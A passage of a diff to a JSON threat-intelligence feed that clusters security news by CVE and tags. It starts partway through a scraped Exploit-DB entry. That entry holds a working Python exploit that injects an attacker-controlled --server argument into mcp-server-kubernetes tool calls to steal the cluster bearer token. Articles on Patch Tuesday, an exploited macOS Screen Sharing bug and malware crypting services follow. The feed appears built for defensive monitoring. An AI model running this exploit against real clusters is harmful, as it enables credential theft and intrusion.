http://attacker.example.com:6443)\") parser.add_argument(\"--tool\", default=\"kubectl_get\", choices=[\"kubectl_get\", \"kubectl_describe\", \"kubectl_delete\"], help=\"Tool to exploit\") parser.add_argument(\"--namespace\", default=\"default\", help=\"Kubernetes namespace\") args = parser.parse_args() # Malicious payload - inject --server via resourceType payload = { \"jsonrpc\": \"2.0\", \"method\": \"tools/call\", \"params\": { \"name\": args.tool, \"arguments\": { \"resourceType\": f\"--server={args.attacker}\", \"name\": \"dummy-pod\", \"namespace\": args.namespace, \"output\": \"json\" } }, \"id\": 1 } print(f\"[+] Sending exploit to {args.target} using {args.tool}\") print(f\"[+] Attacker server: {args.attacker}\") print(\"[+] Waiting for token exfiltration...\") try: response = requests.post( args.target, json=payload, headers={\"Content-Type\": \"application/json\"}, timeout=10 ) print(f\"[+] Response status: {response.status_code}\") if response.status_code == 200: print(\"[+] Exploit sent successfully. Check your listener for the bearer token!\") else: print(f\"[-] Unexpected response: {response.text[:500]}\") except Exception as e: print(f\"[-] Error: {e}\") if __name__ == \"__main__\": if len(sys.argv) < 2: print(\"Usage: python3 exploit.py --target <MCP_URL> --attacker <ATTACKER_URL>\") sys.exit(1) main() Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers S",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "Kubernetes",
+            "Anthropic/Claude",
+            "GitHub"
+          ],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2026-61459"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "poc_available",
+            "critical_cvss"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_offensive_research",
+          "role_map": {
+            "Kubernetes": "target",
+            "Anthropic/Claude": "target",
+            "GitHub": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Exploit-DB",
+          "cohort": "offensive_vulnerability_research",
+          "title": "[remote] mcp-server-kubernetes 3.8.x - Argument Injection",
+          "link": "https://www.exploit-db.com/exploits/52638",
+          "published": "2026-08-11T00:00:00+00:00",
+          "summary": "mcp-server-kubernetes 3.8.x - Argument Injection",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Kubernetes",
+              "Anthropic/Claude",
+              "GitHub"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-61459"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "poc_available",
+              "critical_cvss"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_offensive_research",
+            "role_map": {
+              "Kubernetes": "target",
+              "Anthropic/Claude": "target",
+              "GitHub": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Google Cloud Security",
+          "cohort": "cloud_identity_infrastructure",
+          "title": "ClusterNetworkPolicy in GKE: Balancing control and autonomy for your microservices",
+          "link": "https://cloud.google.com/blog/products/networking/new-clusternetworkpolicy-in-gke/",
+          "published": "2026-08-10T16:00:00+00:00",
+          "summary": "Managing network security in a multi-tenant Kubernetes environment typically requires balancing two distinct needs: developers need their microservices to communicate effectively, while platform and security teams must maintain compliance, prevent lateral movement, and establish cluster-wide guardrails. Historically, the standard Kubernetes NetworkPolicy has been the primary tool for this. While effective for single-namespace isolation, standard NetworkPolicy is scoped strictly to individual namespaces and designed around developer self-service. When cluster administrators attempt to use it for global security enforcement, it can lead to policy conflicts and operational challenges. To address this, we introduced ClusterNetworkPolicy (CNP) , an open-source standard developed by the Kubernetes SIG-Policy Working Group (WG), to Google Kubernetes Engine (GKE). Designed for scale, CNP is a cluster-wide resource that allows administrators to manage network security centrally, providing a mec",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Kubernetes"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_2_operator",
+            "role_map": {
+              "Kubernetes": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "d8fada4bb9",
       "priority_score": 14,
       "member_count": 1,
@@ -3054,6 +2941,142 @@
             "role_map": {
               "Linux kernel": "target",
               "Anthropic/Claude": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "02b0e547f6",
+      "priority_score": 13,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [
+        "CVE-2026-62878"
+      ],
+      "taxonomy": {
+        "threat_categories": [
+          "active_exploitation",
+          "zero_day"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Azure",
+          "Microsoft Entra",
+          "Microsoft SharePoint"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-62815",
+          "CVE-2026-62832",
+          "CVE-2026-62878",
+          "CVE-2026-63508",
+          "CVE-2026-68820"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "actively_exploited",
+          "critical_cvss",
+          "zero_day"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Dark Reading",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Microsoft's Patch Tuesday Deluge Continues With August Updates",
+        "link": "https://www.darkreading.com/application-security/microsofts-patch-tuesday-deluge-continues",
+        "published": "2026-08-11T21:42:34+00:00",
+        "summary": "The most concerning bug in the batch is CVE-2026-62878 (CVSS: 9.8), a remote code execution (RCE) vulnerability in Windows DNS Server that requires no user interaction.",
+        "full_body": "Application Security Vulnerabilities & Threats Threat Intelligence News Microsoft's Patch Tuesday Deluge Continues With August Updates The most concerning bug in the batch is CVE-2026-62878 (CVSS: 9.8), a remote code execution (RCE) vulnerability in Windows DNS Server that requires no user interaction. Jai Vijayan , Contributing Writer August 11, 2026 4 Min Read Source: tomeqs via Shutterstock Following its earlier warning that large-volume security updates, spawned in part by AI-assisted bug-hunting, could become the new norm for the foreseeable future, Microsoft this week released fixes for 421 unique CVEs, including two zero-day vulnerabilities. Of these, 236 vulnerabilities affect Windows, while 98 each affect Office and Office 2016. SharePoint Server accounted for 30 vulnerabilities, followed by Developer Tools, with 26; Azure, with 17; and Exchange Server for another seven. Microsoft assessed 44 of the CVEs as critical severity and a vast majority of the others as \"important\" or \"moderate\" severity bugs. In total, 180 of the vulnerabilities in Microsoft's August 2026 update were elevation of privilege (EoP) issues that give attackers the ability to gain full SYSTEM level privileges on affected devices. And indeed, the highest priority bug to patch in Microsoft's August update is CVE-2026-68820 (CVSS: 7.0), an elevation of privilege (EoP) vulnerability in Windows Ancillary Function Driver for WinSock that attackers are actively exploiting. Related: Belgium's eID Authentication Opens Citizen Accounts to RCE The zero-day bug allows a locally authenticated attacker to elevate privileges and gain SYSTEM level access on affected systems. No user interaction is required for an exploit to work. \"Because the driver is present on most Windows systems, it gives attackers a broad target and a potential path from limited access to full control,\" warned Amol Sarwate, head of security research and REDLab at Cohesity, in a statement. CVE-2026-62832 (CVSS: 7.8) is another flaw that merits immediate patching priority because it's a publicly known zero-day vulnerability — prior to this month's update — that Microsoft believes attackers will likely exploit in the near future. According to Sarwate, the bug, when used in conjunction with the actively exploited CVE-2026-68820, could allow an attacker to turn an initial foothold into a full system compromise. \"That makes this pair the clear priority for defenders this month,\" he said. Other High Priority Issues for Microsoft Users Among the dozens of critical vulnerabilities disclosed this month, one that stands out according to Dustin Childs, head of threat awareness at the Zero Day Initiative, is CVE-2026-62878 (CVSS: 9.8). It's a remote code-execution (RCE) vulnerability in Windows DNS Server that requires no user interaction. In a blog post , Childs characterized the near-maximum severity vulnerability as a \"good ol' fashioned stack-based buffer overflow\" that is, most concerningly, wormable. Related: Outdated Cybercrime Laws Put Security Researchers at Risk \"Microsoft states exploitation is less likely, but I wouldn't count on that,\" he said. \"I suggest testing and deploying this one quickly, especially to your Internet-facing DNS servers.\" Mike Walters, president and co-founder of Action1, also highlighted CVE-2026-62815 (CVSS: 9.8), another near-maximum severity RCE in Microsoft's implementation of the QUIC network transport protocol . \"Because authentication and user interaction are not required, exposed vulnerable services could present a significant organizational risk,\" Walters warned in a statement. Microsoft assigned CVSS severity scores of 9.0 or more to several other vulnerabilities. Among them are CVE-2026-63508 , a maximum severity EoP bug affecting Microsoft Planetary Computer Pro; CVE-2026-70332 (CVSS: 9.6), a Microsoft Office SharePoint spoofing vulnerability; CVE-2026-59115 (CVSS: 9.9), a Microsoft Entra Provisioning Service EoP vulnerability; and CVE-2026-62873 (CVSS: 9.8)",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "zero_day",
+            "active_exploitation"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "Microsoft Entra",
+            "Microsoft SharePoint",
+            "Azure"
+          ],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2026-62878",
+            "CVE-2026-68820",
+            "CVE-2026-62832",
+            "CVE-2026-62815",
+            "CVE-2026-63508"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "actively_exploited",
+            "zero_day",
+            "critical_cvss"
+          ],
+          "content_type": "news_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "Microsoft Entra": "target",
+            "Microsoft SharePoint": "target",
+            "Azure": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Dark Reading",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Microsoft's Patch Tuesday Deluge Continues With August Updates",
+          "link": "https://www.darkreading.com/application-security/microsofts-patch-tuesday-deluge-continues",
+          "published": "2026-08-11T21:42:34+00:00",
+          "summary": "The most concerning bug in the batch is CVE-2026-62878 (CVSS: 9.8), a remote code execution (RCE) vulnerability in Windows DNS Server that requires no user interaction.",
+          "taxonomy": {
+            "threat_categories": [
+              "zero_day",
+              "active_exploitation"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Microsoft Entra",
+              "Microsoft SharePoint",
+              "Azure"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-62878",
+              "CVE-2026-68820",
+              "CVE-2026-62832",
+              "CVE-2026-62815",
+              "CVE-2026-63508"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "actively_exploited",
+              "zero_day",
+              "critical_cvss"
+            ],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Microsoft Entra": "target",
+              "Microsoft SharePoint": "target",
+              "Azure": "target"
             },
             "weak_tags": {
               "products": []
@@ -3615,6 +3638,235 @@
             "content_type": "news_report",
             "confidence_tier": "tier_3_analysis",
             "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "594fd8e6bd",
+      "priority_score": 12,
+      "member_count": 5,
+      "corroborating_source_count": 4,
+      "strong_signals": [
+        "Apple iOS/macOS"
+      ],
+      "taxonomy": {
+        "threat_categories": [
+          "active_exploitation",
+          "credential_theft",
+          "data_breach",
+          "zero_day"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "government"
+        ],
+        "affected_products": [
+          "Apple iOS/macOS",
+          "Fortinet",
+          "Google Cloud"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-65400"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "no_patch_yet",
+          "poc_available",
+          "preauth_unauth",
+          "zero_day"
+        ],
+        "content_type": [
+          "news_report",
+          "vulnerability_disclosure"
+        ],
+        "confidence_tier": [
+          "tier_3_analysis",
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "SecurityWeek",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Recent macOS Screen Sharing Vulnerability Exploited in Attacks",
+        "link": "https://www.securityweek.com/recent-macos-screen-sharing-vulnerability-exploited-in-attacks/",
+        "published": "2026-08-17T08:47:38+00:00",
+        "summary": "Threat actors gained root access to the vulnerable systems and deployed a Monero miner. The post Recent macOS Screen Sharing Vulnerability Exploited in Attacks appeared first on SecurityWeek .",
+        "full_body": "Threat actors are exploiting a recently patched macOS vulnerability to gain root access and deploy cryptominers. The exploited bug, tracked as CVE-2026-65400, is a high-severity authentication issue in Screen Sharing that allows remote attackers to log in without valid credentials. Apple disclosed the flaw on August 6, when it rolled out fixes in macOS Tahoe 26.6.1, macOS Sequoia 15.7.9, and macOS Sonoma 14.8.9. Roughly a week later, the Dutch National Cyber Security Centrum (NCSC) warned that in-the-wild exploitation has started, fueled by the existence of a public proof-of-concept (PoC) exploit. “The NCSC has received a notification showing that active abuse of this vulnerability has been observed on multiple systems on which port 5900 was accessible from the internet,” NCSC says. Threat actors have been exploiting the security defect to gain root access to the vulnerable systems and install a Monero miner, it says. Advertisement. Scroll to continue reading. “Apple has improved state management mechanisms to enforce correct validation of login credentials and prevent unauthorized authentication attempts,” NCSC notes. According to AI security firm Calif, the flaw allows a remote attacker to authenticate to a macOS system that has Screen Sharing enabled by simply naming an account. “Naming an account is the one thing the bug needs. It is not much of a barrier. A username is not a secret, and macOS prints them on the login window,” Calif notes. CVE-2026-65400, however, is not the only recently patched vulnerability in screensharingd, the daemon responsible for managing Screen Sharing connections. In late July, Apple patched at least four other issues in it, including three that have CVE identifiers. Reportedly, the fourth, which was silently addressed, was the most severe of them, as it allowed unauthenticated attackers to gain remote code execution as root. According to security researcher osxreverser , the issue could be exploited to take over any macOS with Screen Sharing enabled, as long as the attacker knew its IP address and SIP was disabled. The flaw reportedly did not require user interaction and could allow an attacker to plant a reverse shell and a root crontab through the same connection. On August 8, osxreverser warned that approximately 40,000 internet-accessible macOS systems had Screen Sharing enabled, meaning that they were potentially exposed to attacks. Related: Hackers Exploiting Unpatched GeoServer Zero-Day Related: Adobe Commerce Bug Targeted Immediately After Disclosure Related: WordPress 7.0.4 Patches Remote Code Execution Vulnerability Related: Fortinet Patches Authentication Flaws in FortiWeb and FortiManager Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire 14,000 Trezor Customers Impacted by Data Breach at ShipMonk Hackers Exploiting Unpatched GeoServer Zero-Day AmnesiaStealer macOS Malware Steals Data, Controls Browser Sessions Adobe Commerce Bug Targeted Immediately After Disclosure WordPress 7.0.4 Patches Remote Code Execution Vulnerability Fortinet Patches Authentication Flaws in FortiWeb and FortiManager Critical VMware vCenter Vulnerability in Attackers’ Crosshairs Nightmare Eclipse Drops Windows Zero-Day Exploit ‘ShieldBreak’ Latest News 40,000 Impacted by SafePal Data Breach Critical SAP Commerce Cloud Vulnerability Exploited 3 Days After Disclosure Fortune 500 Companies Hit in Azure Data Theft Campaign In Other News: Rapid7 Layoffs, Hacking a Boeing 737, Refrigeration System Vulnerabilities Trivy, Not LiteLLM Behind the 2,500 Org Compromise Google Cloud Sets Out Post-Quantum Roadmap With 2029 Readiness Goal 1.6 Million Likely Impacted by RingCentral Data Breach Over 1,000 Charities Hit by Beacon CRM Data Breach Trending Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing to ",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "zero_day",
+            "data_breach",
+            "active_exploitation"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "Apple iOS/macOS",
+            "Google Cloud",
+            "Fortinet"
+          ],
+          "tools_used": [],
+          "cve_ids": [
+            "CVE-2026-65400"
+          ],
+          "attack_techniques": [],
+          "urgency_signals": [
+            "zero_day",
+            "preauth_unauth",
+            "no_patch_yet",
+            "poc_available"
+          ],
+          "content_type": "vulnerability_disclosure",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "Apple iOS/macOS": "target",
+            "Google Cloud": "target",
+            "Fortinet": "target",
+            "VMware": "target",
+            "WordPress": "target",
+            "Azure": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "SecurityWeek",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Recent macOS Screen Sharing Vulnerability Exploited in Attacks",
+          "link": "https://www.securityweek.com/recent-macos-screen-sharing-vulnerability-exploited-in-attacks/",
+          "published": "2026-08-17T08:47:38+00:00",
+          "summary": "Threat actors gained root access to the vulnerable systems and deployed a Monero miner. The post Recent macOS Screen Sharing Vulnerability Exploited in Attacks appeared first on SecurityWeek .",
+          "taxonomy": {
+            "threat_categories": [
+              "zero_day",
+              "data_breach",
+              "active_exploitation"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Apple iOS/macOS",
+              "Google Cloud",
+              "Fortinet"
+            ],
+            "tools_used": [],
+            "cve_ids": [
+              "CVE-2026-65400"
+            ],
+            "attack_techniques": [],
+            "urgency_signals": [
+              "zero_day",
+              "preauth_unauth",
+              "no_patch_yet",
+              "poc_available"
+            ],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Apple iOS/macOS": "target",
+              "Google Cloud": "target",
+              "Fortinet": "target",
+              "VMware": "target",
+              "WordPress": "target",
+              "Azure": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "BleepingComputer",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Hackers exploit macOS Screen Sharing flaw to deploy Monero miner",
+          "link": "https://www.bleepingcomputer.com/news/security/hackers-exploit-macos-screen-sharing-flaw-to-deploy-monero-miner/",
+          "published": "2026-08-14T14:59:55+00:00",
+          "summary": "The Netherlands' National Cyber Security Centre (NCSC) is warning that hackers are actively exploiting a macOS authentication bypass vulnerability after public exploit code emerged. [...]",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Apple iOS/macOS"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Apple iOS/macOS": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Risky Business News",
+          "cohort": "practitioner_analysis",
+          "title": "Risky Bulletin: US will let private companies carry out offensive cyber ops",
+          "link": "https://risky.biz/RBNEWS600/",
+          "published": "2026-08-14T04:37:40+00:00",
+          "summary": "The White House will let private companies carry out offensive cyber ops, an AI hacking campaign breached Taiwan’s government, a macOS bug was exploited over the internet to drop cryptominers, and Kenya orders internet cafes to store logs.",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [
+              "government"
+            ],
+            "affected_products": [
+              "Apple iOS/macOS"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_3_analysis",
+            "role_map": {
+              "Apple iOS/macOS": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        },
+        {
+          "source": "Infosecurity Magazine",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Novel macOS Infostealer AmnesiaStealer Spread via ClickFix",
+          "link": "https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/",
+          "published": "2026-08-14T10:45:00+00:00",
+          "summary": "AmnesiaStealer contains novel functions, including the attackers gaining remote control over the victim’s browser to steal cookie data",
+          "taxonomy": {
+            "threat_categories": [
+              "credential_theft"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Apple iOS/macOS"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Apple iOS/macOS": "target"
+            },
             "weak_tags": {
               "products": []
             }
@@ -4609,6 +4861,81 @@
       ]
     },
     {
+      "cluster_id": "afcea3ecd9",
+      "priority_score": 10,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_government"
+        ]
+      },
+      "primary": {
+        "source": "SANS Internet Storm Center",
+        "cohort": "government_authoritative",
+        "title": "Wireshark 4.6.8 Released, (Sun, Aug 16th)",
+        "link": "https://isc.sans.edu/diary/rss/33248",
+        "published": "2026-08-16T21:31:48+00:00",
+        "summary": "Wireshark release 4.6.8 fixes 28 vulnerabilities and 25 bugs.",
+        "full_body": "",
+        "fetch_status": "fetch_failed:HTTPError",
+        "taxonomy": {
+          "threat_categories": [],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_government",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "SANS Internet Storm Center",
+          "cohort": "government_authoritative",
+          "title": "Wireshark 4.6.8 Released, (Sun, Aug 16th)",
+          "link": "https://isc.sans.edu/diary/rss/33248",
+          "published": "2026-08-16T21:31:48+00:00",
+          "summary": "Wireshark release 4.6.8 fixes 28 vulnerabilities and 25 bugs.",
+          "taxonomy": {
+            "threat_categories": [],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_1_government",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "452d902ac4",
       "priority_score": 10,
       "member_count": 1,
@@ -4833,13 +5160,15 @@
       ]
     },
     {
-      "cluster_id": "afcea3ecd9",
+      "cluster_id": "44f04ecb50",
       "priority_score": 10,
       "member_count": 1,
       "corroborating_source_count": 1,
       "strong_signals": [],
       "taxonomy": {
-        "threat_categories": [],
+        "threat_categories": [
+          "ransomware_extortion"
+        ],
         "actor_attribution": [],
         "affected_industries": [],
         "affected_products": [],
@@ -4851,20 +5180,22 @@
           "news_report"
         ],
         "confidence_tier": [
-          "tier_1_government"
+          "tier_1_primary_research"
         ]
       },
       "primary": {
-        "source": "SANS Internet Storm Center",
-        "cohort": "government_authoritative",
-        "title": "Wireshark 4.6.8 Released, (Sun, Aug 16th)",
-        "link": "https://isc.sans.edu/diary/rss/33248",
-        "published": "2026-08-16T21:31:48+00:00",
-        "summary": "Wireshark release 4.6.8 fixes 28 vulnerabilities and 25 bugs.",
-        "full_body": "",
-        "fetch_status": "fetch_failed:HTTPError",
+        "source": "Recorded Future",
+        "cohort": "threat_research_primary",
+        "title": "Malware Crypting Services and the Threat Actors Who Sell Them",
+        "link": "https://www.recordedfuture.com/research/malware-crypting-services-threat-actors",
+        "published": "2026-08-13T00:00:00+00:00",
+        "summary": "Insikt Group analyzes 24 threat actors selling malware crypting services. Learn about their evasion techniques, market dynamics, and how defenders can prioritize behavioral detection over static analysis.",
+        "full_body": "Malware Crypting Services and the Threat Actors Who Sell Them Executive Summary Crypting services and products modify malicious payloads to help threat actors bypass detection, complicate analysis, and preserve malware usability after exposure. Although basic crypting consists of encrypting or obfuscating a customer-supplied payload, mature providers increasingly operate as broader malware-enablement services. Their offerings often combine payload wrapping, in-memory execution, anti-analysis checks, process injection, persistence options, delivery packaging, and post-detection “cleaning” or re-crypting services. Insikt Group analyzed 24 threat actors advertising crypting services and products within the past year and identified a market that is competitive, reputation-driven, and heavily focused on Windows payloads. Providers advertise through underground forums, restricted communities, chat platforms, clearnet sites, and social media accounts. They compete through tiered pricing, antivirus (AV) detection scores of crypted samples, discounts, malware-developer partnerships, private or shared stubs, and promised turnaround times for re-crypting detected payloads. Advertised crypter capabilities vary by provider, but the underlying objectives are consistent: reduce detection, delay or prevent analysis, and support stealthier payload execution. Because crypted payloads are designed to defeat both static and dynamic analysis, defenders should prioritize behavioral detection over static indicators. See the Outlook and Mitigations section for details. Key Findings AV and endpoint detection and response (EDR) tools should not be treated as sufficient standalone protection against crypted payloads. Defenders should pair endpoint controls with behavioral detection, telemetry correlation, upstream hunting, suspicious process monitoring, and rapid triage of suspicious samples. Popular crypting service providers primarily advertise support for Windows payloads, with no identified advertising for macOS or Linux crypting services. However, although Windows environments were most frequently targeted by the services reviewed in this report, they are not inherently more susceptible to the execution of crypted payloads. Crypted payloads increase the likelihood of successful malware execution and delayed detection, but they do not independently provide end-to-end intrusion capability. Downstream activities, such as lateral movement, data theft, ransomware deployment, and follow-on compromise, depend on the embedded malware and the operator's objectives. Crypter risk varies significantly with provider maturity and technical capability: advanced crypters offer portability, anti-analysis, process injection, persistence, and security product bypass capabilities, whereas less-advanced crypters generally provide basic payload obfuscation techniques. Crypter capabilities are generally not novel individually, but their commercial packaging makes established defense-evasion tradecraft easier to access, reuse, and operationalize. The significance of crypters lies less in technical innovation than in making mature evasion methods available as paid services. The Crypter Landscape What Is a “Crypter”? “Crypting” is what threat researchers generally refer to as a service or product wherein a file, almost exclusively a malicious executable of some kind, is encrypted to bypass malware detection technologies. The result of a crypting service is a malicious payload that modifies the supplied executable in ways that deter defenders and endpoint security solutions (namely, AV and EDR products) from detecting and analyzing it. How Does Crypting Work? While the core functionality of a crypting service or product is to encrypt a payload, services vary in the capabilities they provide. These capabilities can range from the encryption algorithms used, which are often proprietary, to behavioral adjustments for how the resultant payload will execute in a victim environmen",
+        "fetch_status": "ok",
         "taxonomy": {
-          "threat_categories": [],
+          "threat_categories": [
+            "ransomware_extortion"
+          ],
           "actor_attribution": [],
           "affected_industries": [],
           "affected_products": [],
@@ -4873,7 +5204,7 @@
           "attack_techniques": [],
           "urgency_signals": [],
           "content_type": "news_report",
-          "confidence_tier": "tier_1_government",
+          "confidence_tier": "tier_1_primary_research",
           "role_map": {},
           "weak_tags": {
             "products": []
@@ -4882,14 +5213,16 @@
       },
       "corroborating_sources": [
         {
-          "source": "SANS Internet Storm Center",
-          "cohort": "government_authoritative",
-          "title": "Wireshark 4.6.8 Released, (Sun, Aug 16th)",
-          "link": "https://isc.sans.edu/diary/rss/33248",
-          "published": "2026-08-16T21:31:48+00:00",
-          "summary": "Wireshark release 4.6.8 fixes 28 vulnerabilities and 25 bugs.",
+          "source": "Recorded Future",
+          "cohort": "threat_research_primary",
+          "title": "Malware Crypting Services and the Threat Actors Who Sell Them",
+          "link": "https://www.recordedfuture.com/research/malware-crypting-services-threat-actors",
+          "published": "2026-08-13T00:00:00+00:00",
+          "summary": "Insikt Group analyzes 24 threat actors selling malware crypting services. Learn about their evasion techniques, market dynamics, and how defenders can prioritize behavioral detection over static analysis.",
           "taxonomy": {
-            "threat_categories": [],
+            "threat_categories": [
+              "ransomware_extortion"
+            ],
             "actor_attribution": [],
             "affected_industries": [],
             "affected_products": [],
@@ -4898,7 +5231,7 @@
             "attack_techniques": [],
             "urgency_signals": [],
             "content_type": "news_report",
-            "confidence_tier": "tier_1_government",
+            "confidence_tier": "tier_1_primary_research",
             "role_map": {},
             "weak_tags": {
               "products": []
@@ -4993,87 +5326,6 @@
                   0.25
                 ]
               ]
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "44f04ecb50",
-      "priority_score": 10,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "ransomware_extortion"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research"
-        ]
-      },
-      "primary": {
-        "source": "Recorded Future",
-        "cohort": "threat_research_primary",
-        "title": "Malware Crypting Services and the Threat Actors Who Sell Them",
-        "link": "https://www.recordedfuture.com/research/malware-crypting-services-threat-actors",
-        "published": "2026-08-13T00:00:00+00:00",
-        "summary": "Insikt Group analyzes 24 threat actors selling malware crypting services. Learn about their evasion techniques, market dynamics, and how defenders can prioritize behavioral detection over static analysis.",
-        "full_body": "Malware Crypting Services and the Threat Actors Who Sell Them Executive Summary Crypting services and products modify malicious payloads to help threat actors bypass detection, complicate analysis, and preserve malware usability after exposure. Although basic crypting consists of encrypting or obfuscating a customer-supplied payload, mature providers increasingly operate as broader malware-enablement services. Their offerings often combine payload wrapping, in-memory execution, anti-analysis checks, process injection, persistence options, delivery packaging, and post-detection “cleaning” or re-crypting services. Insikt Group analyzed 24 threat actors advertising crypting services and products within the past year and identified a market that is competitive, reputation-driven, and heavily focused on Windows payloads. Providers advertise through underground forums, restricted communities, chat platforms, clearnet sites, and social media accounts. They compete through tiered pricing, antivirus (AV) detection scores of crypted samples, discounts, malware-developer partnerships, private or shared stubs, and promised turnaround times for re-crypting detected payloads. Advertised crypter capabilities vary by provider, but the underlying objectives are consistent: reduce detection, delay or prevent analysis, and support stealthier payload execution. Because crypted payloads are designed to defeat both static and dynamic analysis, defenders should prioritize behavioral detection over static indicators. 